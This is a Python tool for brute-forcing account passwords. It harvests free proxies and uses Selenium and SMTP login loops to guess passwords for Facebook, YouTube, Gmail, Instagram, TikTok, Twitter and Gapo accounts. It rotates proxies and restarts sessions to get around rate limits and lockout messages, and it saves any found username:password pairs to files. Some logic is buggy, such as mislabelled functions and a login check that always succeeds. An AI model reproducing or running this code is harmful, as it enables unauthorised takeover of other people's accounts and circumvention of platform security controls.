#!/usr/bin/python
# -*- coding: utf-8 -*-
import smtplib
import threading
from optparse import *
import time
import sys
import io
import os
try:
    from selenium import webdriver
except:
    os.system("pip install selenium")
from selenium.webdriver.common.proxy import Proxy, ProxyType
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By
import selenium.common.exceptions
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.firefox.options import Options
try:
    import requests
except:
    os.system("pip install requests")
try:
    from colorama import Fore, Back, Style
except:
    os.system("pip install colorama")
R = '\033[31m'  # red
G = '\033[32m'  # green
W = '\033[0m'  # white (normal)
use = OptionParser("""{}
============================================================================================
-> --getproxylist                   export_filename (E.x: proxy_list.txt)
-~ --type                           Type Social media (E.x: facebook or facebook|instagram)
-< --loadproxylist                  import_filename
-g --gmail                          ACCOUNT gmail @gmail.com
-y --youtube                        ACCOUNT youtube @
-t --tiktok                         ACCOUNT tiktok @
-T --twitter                        ACCOUNT twitter @
-f --facebook                       ACCOUNT facebook @
-i --instagram                      Account instagram
-G --gapo                           ACCOUNT gapo
-b --biztime                        ACCOUNT biztime
-H --hahalolo                       ACCOUNT hahalolo
-l --list                           List    Password BruteForce
============================================================================================
{}""".format(Fore.LIGHTCYAN_EX, Fore.RESET))

use.add_option("->", "--getproxylist", dest="getproxylist",
               help="Export list proxy from website")
use.add_option("-~", "--type", dest="type",
               help="Type Social Media")
use.add_option("-<", "--loadProxyList", dest="loadproxylist",
               help="Import list proxy from file")
use.add_option("-g", "--gmail", dest="gmail",
               help="Write Your Account Gmail")
use.add_option("-y", "--youtube", dest="youtube",
               help="Write Your Account Youtube")
use.add_option("-t", "--tiktok", dest="tiktok",
               help="Write Your Account Tiktok")
use.add_option("-T", "--twitter", dest="twitter",
               help="Write Your Account Twitter")
use.add_option("-f", "--facebook", dest="facebook",
               help="Write Your Account Facebook")
use.add_option("-i", "--instagram", dest="instagram",
               help="Write Your Account Instagram")
use.add_option("-G", "--gapo", dest="gapo",
               help="Write Your Account Gapo")
use.add_option("-b", "--biztime", dest="biztime",
               help="Write Your Account Biztime")
use.add_option("-H", "--hahalolo", dest="hahalolo",
               help="Write Your Account Hahalolo")
use.add_option("-l", "--list", dest="list_password",
               help="Write Your list password")
(options, args) = use.parse_args()
# ===============================Get Proxy List============================


def getProxyList():
    if options.type != None:
        types = str(options.type).split("|")
        index_type = []
        for t in types:
            index_type.append(social_name.index(t))
    else:
        index_type = [0, 1, 2, 3, 4, 5, 6, 7]
    # -------------------------------------------------------
    proxy = Proxy()
    proxy.proxy_type = ProxyType.MANUAL
    capabilities = webdriver.DesiredCapabilities.FIREFOX
    proxy.http_proxy = ''
    proxy.ssl_proxy = ''
    proxy.add_to_capabilities(capabilities)
    ops = Options()
    ops.headless = True
    # --------------------------------------------------------
    func_load = [getProxyList_switcher,
                 getProxyList_spys_1, getProxyList_spys_2, getProxyList_spys_3, getProxyList_free_proxy_list, getProxyList_cybersyndrome_1, getProxyList_cybersyndrome_2, getProxyList_cybersyndrome_3, getProxyList_foxtools, getProxyList_premproxy_1, getProxyList_premproxy_2, getProxyList_premproxy_3]
    threads_get = []
    threads_webdriver = []
    for index_func in range(0, len(func_load)):
        if index_func == 0:
            threads_get.append(threading.Thread(
                target=func_load[index_func], args=(index_type,), name="Thread_"+str(index_func), daemon=True))
        else:
            threads_webdriver.append(None)
            threads_get.append(threading.Thread(
                target=func_load[index_func], args=(ops, capabilities, index_type, threads_webdriver, index_func-1), name="Thread_"+str(index_func), daemon=True))
    for thread_get in threads_get:
        thread_get.start()
    # --------------------------------------------------------
    print(Fore.LIGHTMAGENTA_EX +
          "[!] Starting load proxies from webs"+Fore.RESET)
    while input(Fore.LIGHTMAGENTA_EX +
                "[!] If you want to stop getting proxies, press enter..."+Fore.RESET+'\n') != "":
        continue
    for driver in threads_webdriver:
        if driver != None:
            driver.quit()
    print(Fore.LIGHTMAGENTA_EX +
          "[!] Stopped get proxies from webs")
    os.system('taskkill /f /im geckodriver.exe')
    print(Fore.RESET)
    sys.exit(1)


def getProxyList_switcher(index_type):
    try:
        io.open("proxy_list_switcher.txt", "a+")
        get_str = io.open("proxy_list_switcher.txt", "r").readlines()
        for i in range(1, len(get_str)):
            check_proxy(get_str[i].split(",")[0], index_type)
    except:
        print(Fore.LIGHTMAGENTA_EX +
              "[!] Error get proxy from switcher"+Fore.RESET)


def getProxyList_spys_1(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
    try:
        url = ("https://spys.one/en/free-proxy-list/")
        first_get = True
        driver = webdriver.Firefox(
            options=ops, desired_capabilities=capabilities)
        threads_webdriver[index_in_threads_webdriver] = driver
        driver.implicitly_wait(5)
        driver.get(url)
        check_1 = driver.find_element(
            By.XPATH, "//tbody/tr[3]/td[1]/font[1]").text
        while True:
            if not first_get:
                while True:
                    try:
                        driver = webdriver.Firefox(
                            options=ops, desired_capabilities=capabilities)
                        threads_webdriver[index_in_threads_webdriver] = driver
                        driver.implicitly_wait(5)
                        driver.get(url)
                        check_2 = driver.find_element(
                            By.XPATH, "//tbody/tr[3]/td[1]/font[1]").text
                        if check_1 != check_2:
                            check_1 = check_2
                            break
                        driver.quit()
                        time.sleep(120)
                    except KeyboardInterrupt:
                        raise KeyboardInterrupt
                    except:
                        driver.quit()
            proxies = []
            for row in range(3, 33):
                proxies.append(driver.find_element(
                    By.XPATH, "//tbody/tr["+str(row)+"]/td[1]/font[1]").text)
            driver.quit()
            for proxy in proxies:
                check_proxy(proxy, index_type)
            first_get = False
    except:
        print(Fore.LIGHTMAGENTA_EX+"[!] Error get proxy from "+url+Fore.RESET)
        driver.quit()


def getProxyList_spys_txt(ops, capabilities, index_type, url, threads_webdriver, index_in_threads_webdriver):
    i = 1 if url == "https://spys.me/proxy.txt" else 2
    try:
        driver = webdriver.Firefox(
            options=ops, desired_capabilities=capabilities)
        threads_webdriver[index_in_threads_webdriver] = driver
        driver.implicitly_wait(5)
        first_get = True
        driver.get(url)
        check_1 = driver.find_element(
            By.XPATH, "//body/pre").text.split("\n")
        driver.quit()
        while True:
            if not first_get:
                while True:
                    try:
                        driver = webdriver.Firefox(
                            options=ops, desired_capabilities=capabilities)
                        threads_webdriver[index_in_threads_webdriver] = driver
                        driver.implicitly_wait(5)
                        driver.get(url)
                        check_2 = driver.find_element(
                            By.XPATH, "//body/pre").text.split("\n")
                        driver.quit()
                        if check_1[1] != check_2[1]:
                            check_1 = check_2
                            break
                        time.sleep(600)
                    except KeyboardInterrupt:
                        raise KeyboardInterrupt
                    except:
                        driver.quit()
            for i in range(6, len(check_1)-2):
                check_proxy(check_1[i].split(" ")[0], index_type)
            first_get = False
    except:
        driver.quit()
        print(Fore.LIGHTMAGENTA_EX +
              "[!] Error get proxy from "+url+Fore.RESET)


def getProxyList_spys_2(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
    getProxyList_spys_txt(ops, capabilities, index_type,
                          "https://spys.me/proxy.txt", threads_webdriver, index_in_threads_webdriver)


def getProxyList_spys_3(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
    getProxyList_spys_txt(ops, capabilities, index_type,
                          "https://spys.me/socks.txt", threads_webdriver, index_in_threads_webdriver)


def getProxyList_free_proxy_list(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
    try:
        url = "https://free-proxy-list.net/"
        driver = webdriver.Firefox(
            options=ops, desired_capabilities=capabilities)
        threads_webdriver[index_in_threads_webdriver] = driver
        driver.implicitly_wait(5)
        first_get = True
        driver.get(url)
        check_1 = driver.find_element(
            By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr[1]/td[1]").text+":"+driver.find_element(
            By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr[1]/td[2]").text
        while True:
            if not first_get:
                while True:
                    try:
                        driver = webdriver.Firefox(
                            options=ops, desired_capabilities=capabilities)
                        threads_webdriver[index_in_threads_webdriver] = driver
                        driver.implicitly_wait(5)
                        driver.get(url)
                        check_2 = driver.find_element(
                            By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr[1]/td[1]").text+":"+driver.find_element(
                            By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr[1]/td[2]").text
                        if check_1 != check_2:
                            check_1 = check_2
                            break
                        driver.quit()
                        time.sleep(120)
                    except KeyboardInterrupt:
                        raise KeyboardInterrupt
                    except:
                        driver.quit()
            proxies = []
            for row in range(1, 70):
                proxies.append(driver.find_element(
                    By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr["+str(row)+"]/td[1]").text+":"+driver.find_element(
                    By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr["+str(row)+"]/td[2]").text)
            driver.quit()
            for proxy in proxies:
                check_proxy(proxy, index_type)
            first_get = False
    except:
        print(Fore.LIGHTMAGENTA_EX +
              "[!] Error get proxy from "+url+Fore.RESET)
        driver.quit()


def getProxyList_cybersyndrome(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver, index_url):
    try:
        driver = webdriver.Firefox(
            options=ops, desired_capabilities=capabilities)
        threads_webdriver[index_in_threads_webdriver] = driver
        driver.implicitly_wait(5)
        first_get = True
        cybersyndrome_url = ["http://www.cybersyndrome.net/plr6.html",
                             "http://www.cybersyndrome.net/pla6.html", "http://www.cybersyndrome.net/pld6.html"]
        driver.get(cybersyndrome_url[index_url])
        check_1 = driver.find_element(
            By.XPATH, "//div[@id='content']/div[2]/span").text
        while True:
            if not first_get:
                while True:
                    try:
                        driver = webdriver.Firefox(
                            options=ops, desired_capabilities=capabilities)
                        threads_webdriver[index_in_threads_webdriver] = driver
                        driver.implicitly_wait(5)
                        driver.get(cybersyndrome_url[index_url])
                        check_2 = driver.find_element(
                            By.XPATH, "//div[@id='content']/div[2]/span").text
                        if check_1 != check_2:
                            check_1 = check_2
                            break
                        driver.quit()
                        time.sleep(300)
                    except KeyboardInterrupt:
                        raise KeyboardInterrupt
                    except:
                        driver.quit()
            proxies = []
            if index_url == 0:
                for row in range(1, 31):
                    proxies.append(driver.find_element(
                        By.XPATH, "//td[@id='n"+str(row)+"']").text)
            else:
                for row in range(1, int(driver.find_element(By.XPATH, "//div[@id='content']/div[2]/span[2]").text)+1):
                    proxies.append(driver.find_element(
                        By.XPATH, "//a[@id='n"+str(row)+"']").text)
            driver.quit()
            for proxy in proxies:
                check_proxy(proxy, index_type)
            first_get = False
    except:
        print(Fore.LIGHTMAGENTA_EX +
              "[!"+index_url+"] Error get proxy from http://www.cybersyndrome.net"+Fore.RESET)
        driver.quit()


def getProxyList_cybersyndrome_1(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
    getProxyList_cybersyndrome(ops, capabilities, index_type,
                               threads_webdriver, index_in_threads_webdriver, 0)


def getProxyList_cybersyndrome_2(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
    getProxyList_cybersyndrome(ops, capabilities, index_type,
                               threads_webdriver, index_in_threads_webdriver, 1)


def getProxyList_cybersyndrome_3(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
    getProxyList_cybersyndrome(ops, capabilities, index_type,
                               threads_webdriver, index_in_threads_webdriver, 2)


def getProxyList_foxtools(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
    try:
        driver = webdriver.Firefox(
            options=ops, desired_capabilities=capabilities)
        threads_webdriver[index_in_threads_webdriver] = driver
        driver.implicitly_wait(5)
        first_get = True
        driver.get("http://foxtools.ru/Proxy?page=1")
        check_1 = driver.find_element(
            By.XPATH, "//table[@id='theProxyList']/tbody/tr[1]/td[2]").text
        while True:
            if not first_get:
                while True:
                    try:
                        driver = webdriver.Firefox(
                            options=ops, desired_capabilities=capabilities)
                        threads_webdriver[index_in_threads_webdriver] = driver
                        driver.implicitly_wait(5)
                        driver.get("http://foxtools.ru/Proxy?page=1")
                        check_2 = driver.find_element(
                            By.XPATH, "//table[@id='theProxyList']/tbody/tr[1]/td[2]").text
                        if check_1 != check_2:
                            check_1 = check_2
                            break
                        driver.quit()
                        time.sleep(300)
                    except KeyboardInterrupt:
                        raise KeyboardInterrupt
                    except:
                        driver.quit()
            proxies = []
            for i in range(1, 3):
                driver.get("http://foxtools.ru/Proxy?page="+str(i))
                driver.implicitly_wait(5)
                for row in range(1, 31):
                    proxies.append(driver.find_element(
                        By.XPATH, "//table[@id='theProxyList']/tbody/tr["+str(row)+"]/td[2]").text)
            driver.quit()
            for proxy in proxies:
                check_proxy(proxy, index_type)
            first_get = False
    except:
        print(Fore.LIGHTMAGENTA_EX +
              "[!] Error get proxy from http://foxtools.ru/Proxy"+Fore.RESET)
        driver.quit()


def getProxyList_premproxy(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver, a, b):
    try:
        driver = webdriver.Firefox(
            options=ops, desired_capabilities=capabilities)
        threads_webdriver[index_in_threads_webdriver] = driver
        driver.implicitly_wait(5)
        first_get = True
        driver.get("https://premproxy.com/list/time-0"+str(a)+".htm")
        check_1 = driver.find_element(
            By.XPATH, "//table[@id='proxylistt']/tbody/tr[1]/td[1]").text
        while True:
            if not first_get:
                while True:
                    try:
                        driver = webdriver.Firefox(
                            options=ops, desired_capabilities=capabilities)
                        threads_webdriver[index_in_threads_webdriver] = driver
                        driver.implicitly_wait(5)
                        driver.get(
                            "https://premproxy.com/list/time-0"+str(a)+".htm")
                        check_2 = driver.find_element(
                            By.XPATH, "//table[@id='proxylistt']/tbody/tr[1]/td[1]").text
                        if check_1 != check_2:
                            check_1 = check_2
                            break
                        driver.quit()
                        time.sleep(300)
                    except KeyboardInterrupt:
                        raise KeyboardInterrupt
                    except:
                        driver.quit()
            proxies = []
            for i in range(a, b+1):
                driver.get(
                    "https://premproxy.com/list/time-0"+str(i)+".htm")
                for row in range(1, 53 if i != 7 else 30):
                    proxies.append(driver.find_element(
                        By.XPATH, "//table[@id='proxylistt']/tbody/tr["+str(row)+"]/td[1]").text)
            driver.quit()
            for proxy in proxies:
                check_proxy(proxy, index_type)
            first_get = False
    except Exception as e:
        print(e)
        print(Fore.LIGHTMAGENTA_EX +
              "[!"+str(index_in_threads_webdriver)+"] Error get proxy from https://premproxy.com/list" + Fore.RESET)
        driver.quit()


def getProxyList_premproxy_1(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
    getProxyList_premproxy(ops, capabilities, index_type,
                           threads_webdriver, index_in_threads_webdriver, 1, 2)


def getProxyList_premproxy_2(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
    getProxyList_premproxy(ops, capabilities, index_type,
                           threads_webdriver, index_in_threads_webdriver, 3, 4)


def getProxyList_premproxy_3(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
    getProxyList_premproxy(ops, capabilities, index_type,
                           threads_webdriver, index_in_threads_webdriver, 5, 7)

    # ================================CHECK AND Export PROXY=============================
url_list = ['https://www.facebook.com/login', 'https://www.youtube.com/',
            'https://www.instagram.com', 'https://www.tiktok.com/login/phone-or-email/email', 'https://twitter.com/i/flow/login', 'https://www.gapo.vn/', 'https://biztime.com.vn/', 'https://accounts.hahalolo.com/sign-in/']
social_name = ['facebook', 'youtube', 'instagram',
               'tiktok', 'twitter', 'gapo', 'biztime', 'hahalolo']


def check_proxy(myproxy, index_type):
    for s in index_type:
        try:
            io.open(options.getproxylist, "a+")
            list_in_file = io.open(options.getproxylist, "r").readlines()
            get_str = "" if len(list_in_file) == 0 else list_in_file.pop()
            if not social_name[s]+"-"+myproxy in get_str:
                requests.get(url_list[s],
                             proxies={'https': myproxy, 'http': myproxy}, timeout=1)
                io.open(options.getproxylist, "w").write(
                    social_name[s]+"-"+myproxy+","+get_str)
                print(Fore.LIGHTGREEN_EX+"[V]"+social_name[s] +
                      "-"+myproxy+Fore.RESET)
        except:
            print(Fore.LIGHTRED_EX+"[X]"+social_name[s] +
                  "-"+myproxy+Fore.RESET)


# =================================LOAD PROXY==============================
proxy_list = []


def load_proxy_list(socialname):
    proxy_list.clear()
    proxies = io.open(options.loadproxylist, "r").readlines().pop().split(',')
    for i in range(0, len(proxies)-1):
        element_proxy = proxies[i].split('-')
        if element_proxy[0] == socialname:
            proxy_list.append(element_proxy[1])

# ==============================CHANGE PROXY===============================


def changeProxy(socialname):
    while True:
        if len(proxy_list) == 0:
            load_proxy_list(socialname)
        try:
            myproxy = proxy_list.pop(0)
            requests.get(url_list[social_name.index(socialname)],
                         proxies={'https': myproxy, 'http': myproxy}, timeout=1)
            print(Fore.LIGHTGREEN_EX+"[V]"+"-> "+myproxy+Fore.RESET)
            proxy = Proxy()
            proxy.proxy_type = ProxyType.MANUAL
            proxy.http_proxy = myproxy
            proxy.ssl_proxy = myproxy
            capabilities = webdriver.DesiredCapabilities.FIREFOX
            proxy.add_to_capabilities(capabilities)
            return capabilities
        except KeyboardInterrupt:
            break
        except requests.exceptions.ConnectionError:
            print(Fore.LIGHTRED_EX+"[X]"+"-> "+myproxy+Fore.RESET)
            continue
        except:
            print(Fore.LIGHTRED_EX +
                  "[!] Change proxy Error. Again..."+Fore.RESET)
            break


# ==========================LOAD PASSWORD LIST=============================
password_list = []


def load_password_list():
    for passwd in io.open(options.list_password, "r").readlines():
        password_list.append(passwd.rstrip("\n"))
# ============================FACEBOOK=====================================


def facebook():
    count_while = 0
    count_login = 0
    print("\r{}Facebook Account: {}".format(R, options.facebook))
    print("%s<<<<<<+++++Start  Attacking Facebook+++++>>>>>%s" % (R, W))
    brows = webdriver.Firefox()
    brows.set_page_load_timeout(60)
    while count_while < len(password_list):
        try:
            if count_login % 10 == 0:
                changeProxy()
            brows.get("https://facebook.com/login")
            try:
                brows.find_element(
                    By.XPATH, "//*[@id='facebook']/body/div[3]/div[2]/div/div/div/div/div[3]/button[2]").click()
            except:
                count_login
            try:
                brows.find_element(
                    By.XPATH, "//div[@id='content']/div/div/div[3]/div/div/label/input").click()
                count_login = 0
                continue
            except:
                count_login
            brows.find_element(By.ID, "email").send_keys(options.facebook)
            print('\rPassword [==] {} '.format(password_list[count_while]))
            brows.find_element(By.ID, "pass").send_keys(
                password_list[count_while])
            brows.find_element(By.ID, "loginbutton").click()
            try:
                if brows.find_element(By.XPATH, "//div[@id='error_box']/div").text == "Access Denied":
                    count_login = 0
                    continue
            except:
                count_login
            if 'https://www.facebook.com/?sk=welcome' in brows.current_url or 'https://www.facebook.com/checkpoint' in brows.current_url:
                print("{}[True][+] Password Found [{}][+]".format(G,
                      password_list[count_login]))
                io.open("Facebook.txt", "a").write(
                    options.facebook+":"+password_list[count_login]+"\n")
                break
            print("%s[!] False Login Password%s\n" % (R, W))
            count_login += 1
            count_while += 1
        except TimeoutException:
            print('[!] <<<Time out. Again>>> \n')
            count_login = 0
            continue
        except Exception as e:
            print('[!] <<<There are speeches in Communication>>> \n')
            print(e)
            break

# ==================================YOUTUBE======================================

# //*[@id='content']/div/div[6]/div/ytd-button-renderer/a/tp-yt-paper-button Chấp nhận tất cả


def youtube():
    print("\rYoutube Account: {}".format(options.youtube))
    print("%s<<<<<<+++++Start  Attacking Youtube+++++>>>>>%s" % (R, W))
    brows = webdriver.Firefox(executable_path=r"geckodriver.exe")
    brows.get("https://www.youtube.com/")
    try:
        brows.find_element(
            By.XPATH, "//*[@id='topbar']/div[2]/div[2]/ytd-button-renderer/a").click()
        brows.find_element(
            By.XPATH, "//*[@id='buttons']/ytd-button-renderer").click()
    except Exception as e:
        print(e)
    brows.implicitly_wait(5)
    brows.find_element(By.ID, "identifierId").send_keys(options.youtube)
    brows.find_element(By.ID, "identifierNext").click()
    brows.implicitly_wait(5)
    for password in io.open(options.list_password, "r").readlines():
        password = password.rstrip('\n')
        print('\rPassword [==] {} '.format(password).rstrip("\n"))
        sys.stdout.flush
        try:
            brows.find_element(
                By.XPATH, "//*[@id='password']/div/div/div/input").send_keys(password)
            brows.find_element(By.ID, "loginbutton").click()
            brows.find_element(By.ID, "identifierNext").click()
            if 'https://www.youtube.com' in brows.current_url:
                print(
                    "{}[True][+] Password Found [{}][+]".format(G, password))
                io.open("Youtube.txt", "a").write(
                    options.youtube+":"+password+"\n")
                break
            else:
                print("%s[!] False Login Password%s\n" % (R, W))
        except Exception as e:
            print('[!] <<<There are speeches in Communication>>> \n')
            print(e)
            break


# =================================GMAIL==========================================
# xgevlqrasamvxqwb

def gmail():
    count_while = 0
    print("{}<<<<<<+++++Start Attacking Gmail+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    s = smtplib.SMTP_SSL('smtp.gmail.com')
    while count_while < len(password_list):
        password = password_list[count_while]
        count_while += 1
        try:
            s.login(options.gmail, password)
            print("{}[V] Password Found [{}]{}".format(
                Fore.LIGHTGREEN_EX, password, Fore.RESET))
            io.open("Gmail.txt", "a").write(
                options.instagram+":"+password+"\n")
            break
        except smtplib.SMTPAuthenticationError:
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)

# ==================================INSTAGRAM===================================


def check_login_instagram(brows):
    try:
        if brows.find_element(By.XPATH, "//*[@id='react-root']/section/nav/div[2]/div/div/div[2]/div/div/span").text == "Tìm kiếm":
            return True
    finally:
        return False


def instagram():
    count_while = 0
    count_login = 0
    print("{}Tiktok Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.tiktok, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Tiktok+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    while count_while < len(password_list):
        password = password_list[count_while]
        try:
            password = password_list[count_while]
            if len(password) < 6:
                count_while += 1
                print(Fore.LIGHTRED_EX+"[!] "+password+Fore.RESET)
                continue
            if count_login == 0:
                brows = webdriver.Firefox(
                    executable_path=GeckoDriverManager().install())
                brows.get("https://www.instagram.com")
                brows.implicitly_wait(5)
                try:
                    brows.find_element(
                        By.XPATH, "//body/div[4]/div/div/button[1]").click()
                except:
                    print
                brows.find_element(
                    By.XPATH, '//*[@id="loginForm"]/div/div/div/label/input').send_keys(options.instagram)
                count_login = 1
            brows.find_element(
                By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input').send_keys(password)
            brows.find_element(
                By.XPATH, '//*[@id="loginForm"]/div/div[3]/button').click()
            time.sleep(5)
            if 'https://www.instagram.com/challenge' in brows.current_url or "https://www.instagram.com/accounts" in brows.current_url or check_login_instagram(brows):
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Instagram.txt", "a").write(
                    options.instagram+":"+password+"\n")
                break
            else:
                print("{}[X] {}{}".format(
                    Fore.LIGHTRED_EX, password, Fore.RESET))
            # try:
            #     if brows.find_element(By.XPATH, '//*[@id="slfErrorAlert"]').text == "Chúng tôi không thể kết nối với Instagram. Đảm bảo bạn được kết nối Internet và thử lại.":
            #         brows.quit()
            #         brows = run_web_instagram()
            # except:
            #     print()
            count_while += 1
            brows.find_element(
                By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input').clear()
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break


# =================================TIKTOK======================================
def check_login_tiktok(brows):
    try:
        brows.find_element(By.XPATH, "//*[@id='app']/div/div/div/div/form")
        return True
    except:
        return False


def tiktok():
    count_while = 0
    count_login = 0
    print("{}Tiktok Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.tiktok, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Tiktok+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    while count_while < len(password_list):
        password = password_list[count_while]
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('twitter'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://www.tiktok.com/login/phone-or-email/email")
                brows.find_element(
                    By.XPATH, "//*[@id='loginContainer']/div/form/div/input").send_keys(options.tiktok)
                count_login = 1
            brows.find_element(
                By.XPATH, "//*[@id='loginContainer']/div/form/div[2]/div/input").send_keys(password)
            brows.find_element(
                By.XPATH, "//*[@id='loginContainer']/div/form/button").click()
            if "https://www.tiktok.com/foryou" in brows.current_url or check_login_tiktok(brows):
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Tiktok.txt", "a").write(
                    options.tiktok+":"+password+"\n")
                break
            else:
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            brows.find_element(
                By.XPATH, "//*[@id='loginContainer']/div/form/button").clear()
            count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break


# =================================TWITTER======================================
# Complete
PASS_PATH_TWITTER = "//input[@autocomplete='current-password']"
SUBMIT_PATH_TWITTER = '//*[@id="layers"]/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div[2]/div/div/div/div'


def check_login_twitter(brows):
    try:
        if "Xác nhận danh tính của bạn bằng cách nhập địa chỉ email liên kết với tài khoản Twitter của bạn." in brows.find_element(
                By.XPATH, "//div[@id='react-root']/div/div/div/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div/div/div/div/div[1]/div[1]/div/span/span").text:
            return True
        return False
    except Exception as e:
        print(e)
        return False


def twitter():
    count_while = 0
    count_login = 0
    print("{}Twitter Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.twitter, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Twitter+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('twitter'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://twitter.com/i/flow/login")
                brows.find_element(By.NAME, "text").send_keys(options.twitter)
                brows.find_element(
                    By.XPATH, "//*[@id='layers']/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div[1]/div/div/div[6]").click()
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            brows.find_element(
                By.XPATH, PASS_PATH_TWITTER).send_keys(password)
            brows.find_element(By.XPATH, SUBMIT_PATH_TWITTER).click()
            # try:
            #     brows.find_element(By.XPATH, "//div[@role='button']")
            #     brows.quit()
            #     count_login = 0
            #     continue
            # except:
            #     print
            time.sleep(2)
            if brows.current_url == "https://twitter.com/" or brows.current_url == "https://twitter.com/home" or 'https://twitter.com/account/login_challenge' or check_login_twitter(brows) in brows.current_url:
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Twitter.txt", "a").write(
                    options.twitter+":"+password+"\n")
                break
            else:
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break

# =================================GAPO======================================
# Complete


def gapo():
    count_while = 0
    count_login = 0
    print("{}Gapo Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.gapo, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Gapo+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    path = "//div[@id='root']/div[2]/div/div[2]/"
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if len(password) < 8 or len(password) > 50:
                count_while += 1
                print(Fore.LIGHTRED_EX+"[!] "+password+Fore.RESET)
                continue
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('gapo'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://www.gapo.vn/login")
                brows.find_element(
                    By.XPATH, path+"div[3]/input").send_keys(options.gapo)
                brows.find_element(By.XPATH, path+"button").click()
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            brows.find_element(
                By.XPATH, path+"div[2]/input").send_keys(password)
            brows.find_element(By.XPATH, path+"button").click()
            try:
                if brows.find_element(By.XPATH, "//div[@class='modal-body']").text == "Bạn đã đạt giới hạn số lần đăng nhập. Bạn vui lòng thử lại sau!":
                    brows.quit()
                    count_login = 0
                    continue
                brows.find_element(
                    By.XPATH, "//button[@class='btn btn-sm btn-primary']").click()
                brows.find_element(By.XPATH, path+"div[2]/input").clear()
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
                count_while += 1
            except selenium.common.exceptions.NoSuchElementException:
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Gapo.txt", "a").write(options.gapo+":"+password+"\n")
                brows.quit()
                break
